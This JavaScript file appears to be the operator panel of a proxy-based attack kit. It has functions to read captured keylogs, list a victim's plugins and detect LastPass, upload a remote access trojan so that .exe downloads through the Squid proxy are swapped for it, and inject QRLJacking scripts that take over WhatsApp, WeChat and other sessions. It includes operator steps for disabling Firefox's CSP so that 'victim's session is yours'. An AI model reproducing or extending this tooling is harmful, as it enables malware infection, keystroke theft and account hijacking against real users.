var res = document.querySelector('div.selector');
var back_btn = '<button style="float:left;margin-right:10px;" class="btn" title="Go Back" onclick="list_payloads()">&lt;-</button>';

//redefine xhr.send
var send_req = function(method, url, callback=alert, data=null){
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function(){
   if(xhr.readyState === 4){
      if(xhr.status === 200){
        callback(xhr.responseText);
      }
      else if(xhr.status !== 200){
        callback('');
      }
    }
  }
  xhr.open(method, url, true);
  xhr.send(data);
}

//read file
var read_file = function(fname, callback){
  // SEND REQUEST TO A PHP FILE INSTEAD
  send_req('GET', fname, callback);
}

//COMPLETE
//list plugins
var list_plugins = function(){
  if(!navigator.plugins.length)
    res.innerText = "Nothing found";

  var txt = '';
  [].forEach.call(navigator.plugins, function(e,i){
    txt += (i+1) + '. ';
    txt += e.name + '<br/>';
  });

  res.innerHTML = txt;
}


//COMPLETE
//detect flash
var detect_flash = function(){
  if(navigator.plugins["Shockwave Flash"])
    res.innerText = navigator.plugins["Shockwave Flash"]["description"];
  else
    res.innerText = 'Flash not found';
}

//COMPLETE
//detect lastpass
var detect_lastpass = function(){
    if(typeof(lastpass_f) === "undefined"){//document.querySelector('form').hasAttribute('lpformnum')){
      res.innerText = 'Lastpass not found';
    }
    else{
      res.innerText = 'Lastpass found';
    }
}

var update = function(mode='w'){
  var txt = document.querySelector('textarea').value;
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function(){
    if(xhr.readyState === 4){
      if(xhr.status === 200){
        alert('Updated');
      }
      else if(xhr.status !== 200){
        alert('Update failed');
      }
    }
  }
  xhr.open('POST','index.php', true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send('txt='+encodeURIComponent(txt)+'&mode='+mode);
}
//COMPLETE
//update pasarela
var update_pasarela = function(){
  var read_pasarela = function(txt){
    res.innerHTML = '<textarea>'+txt+'</textarea><br/><button class="btn">Update</button>';
    document.querySelectorAll('button')[1].onclick = function(){
      update('w');
    }
  }
  read_file('/pasarela.js', read_pasarela);
}

//COMPLETE
//read keylogs
var read_keylogs = function(){
  var fname = 'logger.txt';
  var read_keylogs = function(txt){
    if(txt === ''){
      txt = 'Nothing found';
    }
    res.innerText = txt;
  }
  read_file(fname, read_keylogs);
}

var toggle_rat = function(){
  res.innerHTML = back_btn;
  res.innerHTML += '<br/><br/><h3>Upload your RAT</h3><strong>Instructions</strong>:<br/> \
  To enable RAT infection, you first need to upload a RAT. Uploading RAT automatically enables RAT Infection. However,  you \
  <strong>must</strong> reload SQUID i.e. <code>service squid reload</code>. Currently, we only support <strong>.exe</strong>s. \
  Once enabled, <strong>exe</strong>s get replaced with your RAT. To disable, please click "Disable RAT Infection" and reload SQUID. \
  <p><form id="uploadForm" action="" method="post" enctype="multipart/form-data"><input type="file" name="rat" /><input type="submit" \
  value="Upload" /><form></p>';
  res.innerHTML += '<strong style="text-decoration:underline;cursor:pointer;" onclick="send_req(\'GET\', \'index.php?disable\')"> \
  Disable RAT Infection</strong>';
}

var qrljack = function(){
  res.innerHTML = back_btn;
  res.innerHTML += '<br/><br/><h3>Available Sites</h3>';
  res.innerHTML += ' \
  <ol type="1" id="qrljack">   \
  <li>WhatsApp</li><li>WeChat</li><li>AirDroid</li><li>Weibo</li><li>Yandex Mail</li><li>Alibaba</li>   \
  </ol><strong>Note</strong>: Clicking above links appends corresponding QRLJacking code in pasarela.js  \
  or replaces image source only.   \
  ';
  var display_code = function(txt){
    res.innerHTML += '<textarea>'+txt+'</textarea>';
  };
  [].forEach.call(document.querySelectorAll('#qrljack>li'), function(i){
    i.onclick = function(){
      res.innerHTML = '<button class="btn" style="float:left;margin-right:10px;" title="Go Back" onclick="qrljack()">&lt;-</button>';
      res.innerHTML += '<br/><br/><strong>NOTE</strong>: When all set and ready, your browser should send a POST request to QRLJacking.php \
      which creates a <em>qr.data</em> file, and <em>pasarela.js</em> will be updated accordingly to present QRLJacking phishing ads.<br/>';
      res.innerHTML += '  \
      <h3>Client Side Setup:</h3>    \
      1. Open your Firefox browser!<br/>   \
      2. Write "<strong>about:config</strong>" in the URL bar, click the "I\'ll be careful, I promise" confirmation button.<br/> \
      3. Search for a preference named "<strong>security.csp.enable</strong>" and change it\'s value to <strong>false</strong> by \
      double clicking it- to allow performing an XHR Request over a different domain (We\'re not supporting leaving this preference\
      disabled, you may do that while testing, but after that you should set the preference to its original state).<br/>            \
      4. Install  <a href="https://addons.mozilla.org/en-US/firefox/addon/greasemonkey" target="_blank">Greasemonkey</a>, and create \
      a "New User Script" from script below. And, make sure the module is loaded and is running!<br/>  \
      5. Now you\'re ready. Open '+i.innerText+' in your browser, and wait for '+i.innerText+' session to be loaded. Greasemonkey      \
      should now inject our module to catch and <br/>   \
      6. Once QR code is scanned, victim\'s session is yours ..<br/>    \
      <strong>P.S.</strong>: Or you could simply paste following code into your browser\'s console while opening '+i.innerText+'<br/>     \
      ';
      
      res.innerHTML += '<h4>Script for Greasemonkey:</h4>';
      var target = 'QRLJacking.php?f='+i.innerText;
      read_file(target, display_code);
    }
  })
}

var google_analytics = function(){
  res.innerHTML = back_btn;
  res.innerHTML += '<br/><br/>Paste your Analytics code below, and click <u>Update</u><br/>  \
  We\'ll update <em>pasarela.js</em> accordingly.<br/><textarea onblur="this.value=\'//IGNORE\\n\'+ \
  this.value.replace(/<\\/?script>/gi,\'\')"></textarea><br/><button class="btn" onclick="update(\'a\')">Update</button>';
}

//INCOMPLETE
//list payloads
var list_payloads = function(){
  res.innerHTML = ' \
  <ol type="1">  \
    <li onclick="toggle_rat()">Enable RAT Infection</li>   \
    <li onclick="qrljack()">Inject QRLJacking</li>  \
    <li onclick="google_analytics()">Inject Google Analytics</li>    \
  </ol> \
  ';
}
